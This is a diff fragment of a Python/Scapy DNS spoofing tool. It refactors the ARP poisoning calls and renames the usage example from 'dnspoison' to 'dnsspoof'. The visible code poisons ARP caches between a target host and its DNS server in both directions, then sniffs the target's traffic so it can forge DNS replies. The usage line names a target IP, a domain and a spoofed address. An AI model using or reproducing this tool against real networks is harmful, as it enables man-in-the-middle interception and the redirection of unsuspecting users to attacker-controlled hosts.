@@ -8,7 +8,6 @@ iface = ""
 spoofed_dom={}
 sock = 0
 host_ip_addr = ""
-host_mac_addr = ""
 
 # Get the gateway IP and MAC address
 def get_gateway():
@@ -94,17 +93,15 @@ def start_dns_spoofing(cmd):
     sock = conf.L2socket(iface=iface)
     global host_ip_addr
     host_ip_addr = get_if_addr(iface)
-    global host_mac_addr
-    host_mac_addr = get_if_hwaddr(iface)
 
     get_gateway()
 
-    start_arp_thread(dns_server_ip, host_mac_addr, tgtip, 10)
-    start_arp_thread(tgtip, host_mac_addr, dns_server_ip, 10)
+    start_arp_thread(dns_server_ip, tgtip, 10)
+    start_arp_thread(tgtip, dns_server_ip, 10)
 
     sniff(store = 0, filter="src host " + str(tgtip), iface = iface, prn = lambda x: dns_pkt_check(x))
 
 # Example usage:
-# dnspoison -iface enp0s9 -tgtip 10.0.2.4 -dom google.com -spaddr 10.0.2.5 
+# dnsspoof -iface enp0s9 -tgtip 10.0.2.4 -dom google.com -spaddr 10.0.2.5 
 
 
